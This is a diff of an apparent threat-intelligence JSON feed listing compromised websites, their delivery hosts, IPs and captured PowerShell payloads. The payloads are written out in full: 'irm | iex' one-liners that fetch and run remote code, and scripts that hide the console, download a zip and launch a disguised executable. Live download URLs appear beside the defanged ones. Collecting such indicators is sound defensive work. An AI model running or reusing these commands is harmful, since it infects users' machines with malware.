@@ -1,5 +1,81 @@
 [
   {
+    "UrlDomain": "rowantreetheatrecompany.co.uk",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/3d1913df07e3f332"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/zaffsru9nl/3d1913df07e3f332')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/zaffsru9nl/3d1913df07e3f332"
+    ],
+    "ReportId": "cmwwzg4sn0bf20oml6olafw5a",
+    "ScannedAt": "2026-11-26T03:18:21.600000+00:00"
+  },
+  {
+    "UrlDomain": "solopharma.com.tr",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "104.21.50.169"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzfb210be50oml4tqjzwhi",
+    "ScannedAt": "2026-11-26T03:17:43.062000+00:00"
+  },
+  {
+    "UrlDomain": "sondakikavan.com.tr",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.97.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwzdw5g0bbh0omll7tl79gs",
+    "ScannedAt": "2026-11-26T03:16:37.060000+00:00"
+  },
+  {
+    "UrlDomain": "www.tanitoil-marine.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2fb4cc80d6c804e9"
+    ],
+    "IP": [
+      "176.31.233.83"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/2fb4cc80d6c804e9')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/2fb4cc80d6c804e9"
+    ],
+    "ReportId": "cmwwz4un60b1n0omlxioear0m",
+    "ScannedAt": "2026-11-26T03:09:35.215000+00:00"
+  },
+  {
     "UrlDomain": "sogut-haber.cyou",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
@@ -3137,77 +3213,5 @@
     ],
     "ReportId": "cmwrab7xy2goc0omljjalxr0i",
     "ScannedAt": "2026-11-22T03:35:51.003000+00:00"
-  },
-  {
-    "UrlDomain": "gokanke.cyou",
-    "DeliveryUrl": [
-      "friendsoftorreabbey.com"
-    ],
-    "PayloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "ReportId": "cmwra5awt2gdb0oml2wrx9ac8",
-    "ScannedAt": "2026-11-22T03:31:15.014000+00:00"
-  },
-  {
-    "UrlDomain": "mayflowerpllc.com",
-    "DeliveryUrl": [
-      "quembrixel.com"
-    ],
-    "PayloadUrl": [
-      "https://quembrixel.com/56a61926.exe"
-    ],
-    "IP": [
-      "192.232.223.143"
-    ],
-    "Related": [],
-    "Payload": "powershell -WindowStyle Hidden -Command \"$p=Join-Path $env:PUBLIC '56a61926.exe';(New-Object Net.WebClient).DownloadFile('https://quembrixel[.]com/56a61926.exe',$p);Start-Process $p\"",
-    "ResolvedDownloadUrl": [
-      "https://quembrixel.com/56a61926.exe"
-    ],
-    "ReportId": "cmwra3laa2gaw0omlvjjj9cxj",
-    "ScannedAt": "2026-11-22T03:29:55.133000+00:00"
-  },
-  {
-    "UrlDomain": "ihealthytree.com",
-    "DeliveryUrl": [
-      "img-codes-cloude.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://img-codes-cloude.info/5d99abf403611db7",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://img-codes-cloude.info/api.php?s=3a4cbee7efe202a2084b40f3ee3adb6fe03f042266d1dc97&amp;_v=29921968",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://img-codes-cloude.info/api.php?s=e3b0c5497ffaae9db82616369a62781a8fbd599720414d4b",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://img-codes-cloude.info/api.php?s=3a4cbee7efe202a2084b40f3ee3adb6fe03f042266d1dc97&_v=29921968",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'img-codes-cloude[.]info/5d99abf403611db7'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://img-codes-cloude.info/5d99abf403611db7"
-    ],
-    "ReportId": "cmwra2jib2ga20oml2najpclq",
-    "ScannedAt": "2026-11-22T03:29:06.177000+00:00"
   }
 ]
